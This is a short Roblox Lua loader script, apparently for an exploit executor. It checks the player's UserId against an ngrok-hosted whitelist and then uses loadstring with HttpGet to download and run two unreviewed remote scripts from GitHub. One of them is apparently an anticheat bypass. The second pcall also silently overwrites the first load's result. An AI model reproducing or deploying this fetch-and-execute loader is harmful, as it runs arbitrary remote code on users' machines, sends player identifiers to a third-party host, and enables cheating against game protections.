local player = game.Players.LocalPlayer
local rbxid = player.UserId
local API = "https://subventionary-letha-boughten.ngrok-free.dev"  -- ✅ Removed leading space
local url = API .. "/check?rbxid=" .. rbxid  -- ✅ Added /check

-- ✅ Wrap in pcall so a failed request doesn't crash silently
local success, response = pcall(function()
    return game:HttpGet(url)
end)

if not success then
    warn("Failed to reach API:", response)
    return
end

print("API:", response)

if response ~= "valid" then
    warn("Not whitelisted:", response)
    return
end

print("Access granted!")

local ok, err = pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Shookenblook/Venom/refs/heads/main/Venom.lol"))()
end)

local ok, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua",true))()
    end)

if not ok then
    warn("Failed to load script:", err)
end
